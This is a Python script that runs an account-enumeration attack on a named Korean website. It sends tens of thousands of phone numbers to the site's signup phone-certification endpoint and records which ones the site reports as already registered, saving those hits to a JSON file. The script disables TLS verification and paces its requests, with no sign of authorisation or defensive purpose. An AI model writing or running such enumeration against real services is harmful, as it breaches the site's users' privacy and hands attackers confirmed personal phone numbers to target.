#!/usr/bin/env python3
"""us-campus phone enum 0103456xxxx + 0101234xxxx"""
import requests, urllib3, time, json
urllib3.disable_warnings()
BASE = "https://us-campus.co.kr"
H = {"User-Agent": "Mozilla/5.0", "X-Requested-With": "XMLHttpRequest", "Referer": BASE + "/member/join"}
hits = []

def check(phone):
    s = requests.Session(); s.verify = False
    s.get(BASE + "/member/join", timeout=10)
    r = s.post(BASE + "/member/cellphoneCert", data={"countryCode": "82", "cellphone": phone},
               headers=H, timeout=10)
    try:
        j = r.json()
        msg = j.get("message", "")
        if "이미 회원" in msg or "이미 회원가입" in msg:
            return phone, "registered", j
        return None
    except:
        return None

prefixes = ["0103456", "0101234", "0109876", "0105555"]
for prefix in prefixes:
    print(f"=== scanning {prefix}xxxx ===", flush=True)
    for suffix in range(0, 10000):
        phone = f"{prefix}{suffix:04d}"
        if suffix % 500 == 0:
            print(f"  {prefix} progress {suffix}/10000 hits={len(hits)}", flush=True)
        try:
            h = check(phone)
            if h:
                hits.append(h)
                print(f"PHONE HIT {h[0]} {h[1]}", flush=True)
                with open("deep20_phones.json", "w") as f:
                    json.dump(hits, f, ensure_ascii=False, indent=2)
        except Exception as e:
            time.sleep(0.5)
        time.sleep(0.02)
    print(f"done {prefix} total hits={len(hits)}", flush=True)

print(f"FINAL {len(hits)} phones", flush=True)
